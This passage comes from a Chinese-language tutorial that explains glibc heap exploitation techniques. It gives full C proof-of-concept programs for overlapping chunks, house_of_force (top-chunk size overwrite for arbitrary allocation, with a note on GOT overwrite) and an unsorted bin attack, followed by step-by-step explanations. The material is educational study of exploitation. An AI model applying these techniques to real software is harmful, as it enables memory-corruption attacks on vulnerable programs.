&nbsp;&nbsp;printf(&quot;\nNow&nbsp;let&#39;s&nbsp;allocate&nbsp;a&nbsp;new&nbsp;chunk&nbsp;with&nbsp;a&nbsp;size&nbsp;that&nbsp;can&nbsp;be&nbsp;satisfied&nbsp;by&nbsp;the&nbsp;previously&nbsp;freed&nbsp;chunk\n&quot;);

&nbsp;&nbsp;p6&nbsp;=&nbsp;malloc(2000);
&nbsp;&nbsp;real_size_p6&nbsp;=&nbsp;malloc_usable_size(p6);

&nbsp;&nbsp;printf(&quot;\nOur&nbsp;malloc()&nbsp;has&nbsp;been&nbsp;satisfied&nbsp;by&nbsp;our&nbsp;crafted&nbsp;big&nbsp;free&nbsp;chunk,&nbsp;now&nbsp;p6&nbsp;and&nbsp;p3&nbsp;are&nbsp;overlapping&nbsp;and&nbsp;\nwe&nbsp;can&nbsp;overwrite&nbsp;data&nbsp;in&nbsp;p3&nbsp;by&nbsp;writing&nbsp;on&nbsp;chunk&nbsp;p6\n&quot;);
&nbsp;&nbsp;printf(&quot;\nchunk&nbsp;p6&nbsp;from&nbsp;%p&nbsp;to&nbsp;%p&quot;,&nbsp;p6,&nbsp;&nbsp;(unsigned&nbsp;char&nbsp;*)p6+real_size_p6);
&nbsp;&nbsp;printf(&quot;\nchunk&nbsp;p3&nbsp;from&nbsp;%p&nbsp;to&nbsp;%p\n&quot;,&nbsp;p3,&nbsp;(unsigned&nbsp;char&nbsp;*)&nbsp;p3+real_size_p3);&nbsp;

&nbsp;&nbsp;printf(&quot;\nData&nbsp;inside&nbsp;chunk&nbsp;p3:&nbsp;\n\n&quot;);
&nbsp;&nbsp;printf(&quot;%s\n&quot;,(char&nbsp;*)p3);&nbsp;

&nbsp;&nbsp;printf(&quot;\nLet&#39;s&nbsp;write&nbsp;something&nbsp;inside&nbsp;p6\n&quot;);
&nbsp;&nbsp;memset(p6,&#39;F&#39;,1500);&nbsp;&nbsp;

&nbsp;&nbsp;printf(&quot;\nData&nbsp;inside&nbsp;chunk&nbsp;p3:&nbsp;\n\n&quot;);
&nbsp;&nbsp;printf(&quot;%s\n&quot;,(char&nbsp;*)p3);&nbsp;

}</pre><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">翻译：</span></strong></span><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这同样是一个简单的堆块重叠的问题。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这也被称为非相邻free chunk合并攻击。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先malloc五个堆块：</span></p><pre class="brush:cpp;toolbar:false">p1&nbsp;=&nbsp;malloc(1000);
p2&nbsp;=&nbsp;malloc(1000);
p3&nbsp;=&nbsp;malloc(1000);
p4&nbsp;=&nbsp;malloc(1000);
p5&nbsp;=&nbsp;malloc(1000);
free(p4);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">因为p5的存在所以p4不会被合并。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后我们在p1触发一个溢出，将p2的size改写成p2和p3大小的和。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">之后free(p2)的时候，分配器就会认为p4是下一个块（忽略p3）。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后就会错误地将p3和p2合并。</span></p><pre class="brush:cpp;toolbar:false">p6&nbsp;=&nbsp;malloc(2000);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这时返回给p6的地址就是p2的地址了，p6内部也包含了未被free的p3。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们可以愉快地通过p6来改写p3中的任何数据。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个例程介绍的是获得overlapping chunk的另外一种方法。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">上面那种方法是在chunk已经被free的情况下直接修改size字段，然后将chunk malloc出来。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个例程是在chunk被free之前，通过修改size，然后free，欺骗free函数去修改了下一个chunk的presize字段来强行“合并”堆块。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里就是设置了p2的size为p2和p3大小的和，之后更新presize的时候是通过p2的地址加上p2的size来寻找的要修改的位置的，这里刚好就把p4头部的presize给改掉了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">之后的malloc也顺理成章地将p2和p3作为一块内存分配给我们了，尽管p3没有被free。</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x08 house_of_force</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">源码：</span></strong></span></p><pre class="brush:cpp;toolbar:false">/*
&nbsp;&nbsp;&nbsp;This&nbsp;PoC&nbsp;works&nbsp;also&nbsp;with&nbsp;ASLR&nbsp;enabled.
&nbsp;&nbsp;&nbsp;It&nbsp;will&nbsp;overwrite&nbsp;a&nbsp;GOT&nbsp;entry&nbsp;so&nbsp;in&nbsp;order&nbsp;to&nbsp;apply&nbsp;exactly&nbsp;this&nbsp;technique&nbsp;RELRO&nbsp;must&nbsp;be&nbsp;disabled.
&nbsp;&nbsp;&nbsp;If&nbsp;RELRO&nbsp;is&nbsp;enabled&nbsp;you&nbsp;can&nbsp;always&nbsp;try&nbsp;to&nbsp;return&nbsp;a&nbsp;chunk&nbsp;on&nbsp;the&nbsp;stack&nbsp;as&nbsp;proposed&nbsp;in&nbsp;Malloc&nbsp;Des&nbsp;Maleficarum&nbsp;
&nbsp;&nbsp;&nbsp;(&nbsp;http://phrack.org/issues/66/10.html&nbsp;)
&nbsp;&nbsp;&nbsp;Tested&nbsp;in&nbsp;Ubuntu&nbsp;14.04,&nbsp;64bit.
*/
#include&nbsp;&lt;stdio.h&gt;
#include&nbsp;&lt;stdint.h&gt;
#include&nbsp;&lt;stdlib.h&gt;
#include&nbsp;&lt;string.h&gt;
#include&nbsp;&lt;stdint.h&gt;
#include&nbsp;&lt;malloc.h&gt;
char&nbsp;bss_var[]&nbsp;=&nbsp;&quot;This&nbsp;is&nbsp;a&nbsp;string&nbsp;that&nbsp;we&nbsp;want&nbsp;to&nbsp;overwrite.&quot;;
int&nbsp;main(int&nbsp;argc&nbsp;,&nbsp;char*&nbsp;argv[])
{
&nbsp;&nbsp;printf(&quot;\nWelcome&nbsp;to&nbsp;the&nbsp;House&nbsp;of&nbsp;Force\n\n&quot;);
&nbsp;&nbsp;printf(&quot;The&nbsp;idea&nbsp;of&nbsp;House&nbsp;of&nbsp;Force&nbsp;is&nbsp;to&nbsp;overwrite&nbsp;the&nbsp;top&nbsp;chunk&nbsp;and&nbsp;let&nbsp;the&nbsp;malloc&nbsp;return&nbsp;an&nbsp;arbitrary&nbsp;value.\n&quot;);
&nbsp;&nbsp;printf(&quot;The&nbsp;top&nbsp;chunk&nbsp;is&nbsp;a&nbsp;special&nbsp;chunk.&nbsp;Is&nbsp;the&nbsp;last&nbsp;in&nbsp;memory&nbsp;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;and&nbsp;is&nbsp;the&nbsp;chunk&nbsp;that&nbsp;will&nbsp;be&nbsp;resized&nbsp;when&nbsp;malloc&nbsp;asks&nbsp;for&nbsp;more&nbsp;space&nbsp;from&nbsp;the&nbsp;os.\n&quot;);
&nbsp;&nbsp;printf(&quot;\nIn&nbsp;the&nbsp;end,&nbsp;we&nbsp;will&nbsp;use&nbsp;this&nbsp;to&nbsp;overwrite&nbsp;a&nbsp;variable&nbsp;at&nbsp;%p.\n&quot;,&nbsp;bss_var);
&nbsp;&nbsp;printf(&quot;Its&nbsp;current&nbsp;value&nbsp;is:&nbsp;%s\n&quot;,&nbsp;bss_var);
&nbsp;&nbsp;printf(&quot;\nLet&#39;s&nbsp;allocate&nbsp;the&nbsp;first&nbsp;chunk,&nbsp;taking&nbsp;space&nbsp;from&nbsp;the&nbsp;wilderness.\n&quot;);
&nbsp;&nbsp;intptr_t&nbsp;*p1&nbsp;=&nbsp;malloc(256);
&nbsp;&nbsp;printf(&quot;The&nbsp;chunk&nbsp;of&nbsp;256&nbsp;bytes&nbsp;has&nbsp;been&nbsp;allocated&nbsp;at&nbsp;%p.\n&quot;,&nbsp;p1);

&nbsp;&nbsp;printf(&quot;\nNow&nbsp;the&nbsp;heap&nbsp;is&nbsp;composed&nbsp;of&nbsp;two&nbsp;chunks:&nbsp;the&nbsp;one&nbsp;we&nbsp;allocated&nbsp;and&nbsp;the&nbsp;top&nbsp;chunk/wilderness.\n&quot;);
&nbsp;&nbsp;int&nbsp;real_size&nbsp;=&nbsp;malloc_usable_size(p1);
&nbsp;&nbsp;printf(&quot;Real&nbsp;size&nbsp;(aligned&nbsp;and&nbsp;all&nbsp;that&nbsp;jazz)&nbsp;of&nbsp;our&nbsp;allocated&nbsp;chunk&nbsp;is&nbsp;%d.\n&quot;,&nbsp;real_size);

&nbsp;&nbsp;printf(&quot;\nNow&nbsp;let&#39;s&nbsp;emulate&nbsp;a&nbsp;vulnerability&nbsp;that&nbsp;can&nbsp;overwrite&nbsp;the&nbsp;header&nbsp;of&nbsp;the&nbsp;Top&nbsp;Chunk\n&quot;);

&nbsp;&nbsp;//-----&nbsp;VULNERABILITY&nbsp;----
&nbsp;&nbsp;intptr_t&nbsp;*ptr_top&nbsp;=&nbsp;(intptr_t&nbsp;*)&nbsp;((char&nbsp;*)p1&nbsp;+&nbsp;real_size);
&nbsp;&nbsp;printf(&quot;\nThe&nbsp;top&nbsp;chunk&nbsp;starts&nbsp;at&nbsp;%p\n&quot;,&nbsp;ptr_top);

&nbsp;&nbsp;printf(&quot;\nOverwriting&nbsp;the&nbsp;top&nbsp;chunk&nbsp;size&nbsp;with&nbsp;a&nbsp;big&nbsp;value&nbsp;so&nbsp;we&nbsp;can&nbsp;ensure&nbsp;that&nbsp;the&nbsp;malloc&nbsp;will&nbsp;never&nbsp;call&nbsp;mmap.\n&quot;);
&nbsp;&nbsp;&nbsp;printf(&quot;Old&nbsp;size&nbsp;of&nbsp;top&nbsp;chunk&nbsp;%#llx\n&quot;,&nbsp;*((unsigned&nbsp;long&nbsp;long&nbsp;int&nbsp;*)ptr_top));
&nbsp;&nbsp;ptr_top[0]&nbsp;=&nbsp;-1;
&nbsp;&nbsp;printf(&quot;New&nbsp;size&nbsp;of&nbsp;top&nbsp;chunk&nbsp;%#llx\n&quot;,&nbsp;*((unsigned&nbsp;long&nbsp;long&nbsp;int&nbsp;*)ptr_top));
&nbsp;&nbsp;&nbsp;&nbsp;//------------------------

&nbsp;&nbsp;printf(&quot;\nThe&nbsp;size&nbsp;of&nbsp;the&nbsp;wilderness&nbsp;is&nbsp;now&nbsp;gigantic.&nbsp;We&nbsp;can&nbsp;allocate&nbsp;anything&nbsp;without&nbsp;malloc()&nbsp;calling&nbsp;mmap.\n&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;Next,&nbsp;we&nbsp;will&nbsp;allocate&nbsp;a&nbsp;chunk&nbsp;that&nbsp;will&nbsp;get&nbsp;us&nbsp;right&nbsp;up&nbsp;against&nbsp;the&nbsp;desired&nbsp;region&nbsp;(with&nbsp;an&nbsp;integer&nbsp;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;overflow)&nbsp;and&nbsp;will&nbsp;then&nbsp;be&nbsp;able&nbsp;to&nbsp;allocate&nbsp;a&nbsp;chunk&nbsp;right&nbsp;over&nbsp;the&nbsp;desired&nbsp;region.\n&quot;);

&nbsp;&nbsp;unsigned&nbsp;long&nbsp;evil_size&nbsp;=&nbsp;(unsigned&nbsp;long)bss_var&nbsp;-&nbsp;sizeof(long)*2&nbsp;-&nbsp;(unsigned&nbsp;long)ptr_top;
&nbsp;&nbsp;printf(&quot;\nThe&nbsp;value&nbsp;we&nbsp;want&nbsp;to&nbsp;write&nbsp;to&nbsp;at&nbsp;%p,&nbsp;and&nbsp;the&nbsp;top&nbsp;chunk&nbsp;is&nbsp;at&nbsp;%p,&nbsp;so&nbsp;accounting&nbsp;for&nbsp;the&nbsp;header&nbsp;size,\n&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;we&nbsp;will&nbsp;malloc&nbsp;%#lx&nbsp;bytes.\n&quot;,&nbsp;bss_var,&nbsp;ptr_top,&nbsp;evil_size);
&nbsp;&nbsp;void&nbsp;*new_ptr&nbsp;=&nbsp;malloc(evil_size);
&nbsp;&nbsp;printf(&quot;As&nbsp;expected,&nbsp;the&nbsp;new&nbsp;pointer&nbsp;is&nbsp;at&nbsp;the&nbsp;same&nbsp;place&nbsp;as&nbsp;the&nbsp;old&nbsp;top&nbsp;chunk:&nbsp;%p\n&quot;,&nbsp;new_ptr);

&nbsp;&nbsp;void*&nbsp;ctr_chunk&nbsp;=&nbsp;malloc(100);
&nbsp;&nbsp;printf(&quot;\nNow,&nbsp;the&nbsp;next&nbsp;chunk&nbsp;we&nbsp;overwrite&nbsp;will&nbsp;point&nbsp;at&nbsp;our&nbsp;target&nbsp;buffer.\n&quot;);
&nbsp;&nbsp;printf(&quot;malloc(100)&nbsp;=&gt;&nbsp;%p!\n&quot;,&nbsp;ctr_chunk);
&nbsp;&nbsp;printf(&quot;Now,&nbsp;we&nbsp;can&nbsp;finally&nbsp;overwrite&nbsp;that&nbsp;value:\n&quot;);

&nbsp;&nbsp;printf(&quot;...&nbsp;old&nbsp;string:&nbsp;%s\n&quot;,&nbsp;bss_var);
&nbsp;&nbsp;printf(&quot;...&nbsp;doing&nbsp;strcpy&nbsp;overwrite&nbsp;with&nbsp;\&quot;YEAH!!!\&quot;...\n&quot;);
&nbsp;&nbsp;strcpy(ctr_chunk,&nbsp;&quot;YEAH!!!&quot;);
&nbsp;&nbsp;printf(&quot;...&nbsp;new&nbsp;string:&nbsp;%s\n&quot;,&nbsp;bss_var);


&nbsp;&nbsp;//&nbsp;some&nbsp;further&nbsp;discussion:
&nbsp;&nbsp;//printf(&quot;This&nbsp;controlled&nbsp;malloc&nbsp;will&nbsp;be&nbsp;called&nbsp;with&nbsp;a&nbsp;size&nbsp;parameter&nbsp;of&nbsp;evil_size&nbsp;=&nbsp;malloc_got_address&nbsp;-&nbsp;8&nbsp;-&nbsp;p2_guessed\n\n&quot;);
&nbsp;&nbsp;//printf(&quot;This&nbsp;because&nbsp;the&nbsp;main_arena-&gt;top&nbsp;pointer&nbsp;is&nbsp;setted&nbsp;to&nbsp;current&nbsp;av-&gt;top&nbsp;+&nbsp;malloc_size&nbsp;&quot;
&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;&nbsp;&quot;and&nbsp;we&nbsp;\nwant&nbsp;to&nbsp;set&nbsp;this&nbsp;result&nbsp;to&nbsp;the&nbsp;address&nbsp;of&nbsp;malloc_got_address-8\n\n&quot;);
&nbsp;&nbsp;//printf(&quot;In&nbsp;order&nbsp;to&nbsp;do&nbsp;this&nbsp;we&nbsp;have&nbsp;malloc_got_address-8&nbsp;=&nbsp;p2_guessed&nbsp;+&nbsp;evil_size\n\n&quot;);
&nbsp;&nbsp;//printf(&quot;The&nbsp;av-&gt;top&nbsp;after&nbsp;this&nbsp;big&nbsp;malloc&nbsp;will&nbsp;be&nbsp;setted&nbsp;in&nbsp;this&nbsp;way&nbsp;to&nbsp;malloc_got_address-8\n\n&quot;);
&nbsp;&nbsp;//printf(&quot;After&nbsp;that&nbsp;a&nbsp;new&nbsp;call&nbsp;to&nbsp;malloc&nbsp;will&nbsp;return&nbsp;av-&gt;top+8&nbsp;(&nbsp;+8&nbsp;bytes&nbsp;for&nbsp;the&nbsp;header&nbsp;),&quot;
&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;&nbsp;&quot;\nand&nbsp;basically&nbsp;return&nbsp;a&nbsp;chunk&nbsp;at&nbsp;(malloc_got_address-8)+8&nbsp;=&nbsp;malloc_got_address\n\n&quot;);

&nbsp;&nbsp;//printf(&quot;The&nbsp;large&nbsp;chunk&nbsp;with&nbsp;evil_size&nbsp;has&nbsp;been&nbsp;allocated&nbsp;here&nbsp;0x%08x\n&quot;,p2);
&nbsp;&nbsp;//printf(&quot;The&nbsp;main_arena&nbsp;value&nbsp;av-&gt;top&nbsp;has&nbsp;been&nbsp;setted&nbsp;to&nbsp;malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);

&nbsp;&nbsp;//printf(&quot;This&nbsp;last&nbsp;malloc&nbsp;will&nbsp;be&nbsp;served&nbsp;from&nbsp;the&nbsp;remainder&nbsp;code&nbsp;and&nbsp;will&nbsp;return&nbsp;the&nbsp;av-&gt;top+8&nbsp;injected&nbsp;before\n&quot;);
}</pre><p style="text-indent: 2em;"><span style="font-size: 16px; color: rgb(0, 112, 192);"><strong><span style="font-size: 16px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">翻译：</span></strong></span><br/></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">house_of_force</span></strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">的主要思想是，通过改写top chunk来使malloc返回任意地址。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">top chunk是一块非常特殊的内存，它存在于堆区的最后，而且一般情况下，当malloc向os申请内存时，top chunk的大小会变动。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们就利用这个机制来改写一个变量</span></p><pre class="brush:cpp;toolbar:false">char&nbsp;bss_var[]=&nbsp;&quot;This&nbsp;is&nbsp;a&nbsp;string&nbsp;that&nbsp;we&nbsp;want&nbsp;to&nbsp;overwrite.&quot;;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">先分配第一个chunk：</span></p><pre class="brush:cpp;toolbar:false">intptr_t&nbsp;*p1&nbsp;=&nbsp;malloc(256);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在heap区域就存在了两个chunk一个是p1,一个是top chunk。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">p1的真实大小应该是 0x100 + 0x8</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在模拟一个漏洞，改写top chunk的头部，top chunk的起始地址为：</span></p><pre class="brush:cpp;toolbar:false">intptr_t&nbsp;*ptr_top&nbsp;=&nbsp;(intptr_t&nbsp;*)&nbsp;((char&nbsp;*)p1&nbsp;+&nbsp;real_size);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">用一个很大的值来改写top chunk的size，以免等一下申请内存的时候使用<strong>mmap</strong>来分配：</span></p><pre class="brush:cpp;toolbar:false">ptr_top[0]&nbsp;=&nbsp;-1;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">改写之后top chunk的size=0xFFFFFFFF。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在top chunk变得非常大，我们可以malloc一个在此范围内的任何大小的内存而不用调用mmap。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接下来malloc一个chunk，使得这个chunk刚好分配到我们想控制的那块区域为止，然后我们就可以malloc出我们想控制的区域了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">比如：我们想要改写的变量位置在0x602060，top chunk 的位置在0x127b528，再算上head的大小，我们将要malloc 0xffffffffff386b28 个字节。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">新申请的这个chunk开始于原来top chunk所处的位置。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">而此时top chunk已经处在0x602050了，之后再malloc就会返回一个包含我们想要改写的变量的chunk了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个例程和它的名字一样暴力，直接对top chunk下手，想法很大胆的一种攻击方式。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先是修改top chunk的size字段为-1（在x64机器上实际大小就为0xFFFFFFFF）</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后malloc一个很大的值<strong>Large</strong>，L的计算就是用你想控制的地址的值<strong>Ctrl</strong>减去top地址的值<strong>Top</strong>，那么Large = Ctrl - Top 。</span></p><pre class="brush:cpp;toolbar:false">malloc(Large);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">用malloc申请了这个chunk之后top chunk是这样的：</span></p><p style="text-align: center;"><img src="http://p8.qhimg.com/t013836352f20a99233.png" alt=""/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个技巧的利用效果就是，我们可以用malloc返回一个heap区域之前的地址。</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x09 unsorted_bin_attack</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">源码：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">#include&nbsp;&lt;stdio.h&gt;
#include&nbsp;&lt;stdlib.h&gt;
int&nbsp;main(){
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;This&nbsp;file&nbsp;demonstrates&nbsp;unsorted&nbsp;bin&nbsp;attack&nbsp;by&nbsp;write&nbsp;a&nbsp;large&nbsp;unsigned&nbsp;long&nbsp;value&nbsp;into&nbsp;stack\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;In&nbsp;practice,&nbsp;unsorted&nbsp;bin&nbsp;attack&nbsp;is&nbsp;generally&nbsp;prepared&nbsp;for&nbsp;further&nbsp;attacks,&nbsp;such&nbsp;as&nbsp;rewriting&nbsp;the&nbsp;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;global&nbsp;variable&nbsp;global_max_fast&nbsp;in&nbsp;libc&nbsp;for&nbsp;further&nbsp;fastbin&nbsp;attack\n\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;long&nbsp;stack_var=0;
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Let&#39;s&nbsp;first&nbsp;look&nbsp;at&nbsp;the&nbsp;target&nbsp;we&nbsp;want&nbsp;to&nbsp;rewrite&nbsp;on&nbsp;stack:\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;%p:&nbsp;%ld\n\n&quot;,&nbsp;&amp;stack_var,&nbsp;stack_var);
&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;long&nbsp;*p=malloc(400);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Now,&nbsp;we&nbsp;allocate&nbsp;first&nbsp;normal&nbsp;chunk&nbsp;on&nbsp;the&nbsp;heap&nbsp;at:&nbsp;%p\n&quot;,p);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;And&nbsp;allocate&nbsp;another&nbsp;normal&nbsp;chunk&nbsp;in&nbsp;order&nbsp;to&nbsp;avoid&nbsp;consolidating&nbsp;the&nbsp;top&nbsp;chunk&nbsp;with&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;the&nbsp;first&nbsp;one&nbsp;during&nbsp;the&nbsp;free()\n\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;malloc(500);
&nbsp;&nbsp;&nbsp;&nbsp;free(p);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;We&nbsp;free&nbsp;the&nbsp;first&nbsp;chunk&nbsp;now&nbsp;and&nbsp;it&nbsp;will&nbsp;be&nbsp;inserted&nbsp;in&nbsp;the&nbsp;unsorted&nbsp;bin&nbsp;with&nbsp;its&nbsp;bk&nbsp;pointer&nbsp;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;point&nbsp;to&nbsp;%p\n&quot;,(void*)p[1]);
&nbsp;&nbsp;&nbsp;&nbsp;//------------VULNERABILITY-----------
&nbsp;&nbsp;&nbsp;&nbsp;p[1]=(unsigned&nbsp;long)(&amp;stack_var-2);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Now&nbsp;emulating&nbsp;a&nbsp;vulnerability&nbsp;that&nbsp;can&nbsp;overwrite&nbsp;the&nbsp;victim-&gt;bk&nbsp;pointer\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;And&nbsp;we&nbsp;write&nbsp;it&nbsp;with&nbsp;the&nbsp;target&nbsp;address-16&nbsp;(in&nbsp;32-bits&nbsp;machine,&nbsp;it&nbsp;should&nbsp;be&nbsp;target&nbsp;address-8):%p\n\n&quot;,(void*)p[1]);
&nbsp;&nbsp;&nbsp;&nbsp;//------------------------------------
&nbsp;&nbsp;&nbsp;&nbsp;malloc(400);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Let&#39;s&nbsp;malloc&nbsp;again&nbsp;to&nbsp;get&nbsp;the&nbsp;chunk&nbsp;we&nbsp;just&nbsp;free.&nbsp;During&nbsp;this&nbsp;time,&nbsp;target&nbsp;should&nbsp;has&nbsp;already&nbsp;been&nbsp;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;rewrite:\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;%p:&nbsp;%p\n&quot;,&nbsp;&amp;stack_var,&nbsp;(void*)stack_var);
}</pre><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">翻译：</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个例程通过unsortedbin攻击往栈中写入一个unsigned long的值。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在实战中，unsorted bin 攻击通常是为更进一步的攻击做准备的。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">比如，我们在栈上有一个栈单元stack_var需要被改写</span></p><pre class="brush:cpp;toolbar:false">unsigned&nbsp;long&nbsp;stack_var=0;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">然后正常地分配一个chunk。</span></p><pre class="brush:cpp;toolbar:false">unsigned&nbsp;long&nbsp;*p=malloc(400);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">再分配一个，防止前一个chunk在free的时候被合并了。</span></p><pre class="brush:cpp;toolbar:false">malloc(500);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">然后</span></p><pre class="brush:cpp;toolbar:false">free(p);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">之后p会被插入到unsortedbin链表中，而且它的fd和bk都指向unsortedbin的head。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接着我们模拟一个漏洞攻击改写p的bk指针：</span></p><pre class="brush:cpp;toolbar:false">p[1]=(unsigned&nbsp;long)(&amp;stack_var-2);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">然后用malloc出发unsortedbin的unlink：</span></p><pre class="brush:cpp;toolbar:false">malloc(400);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 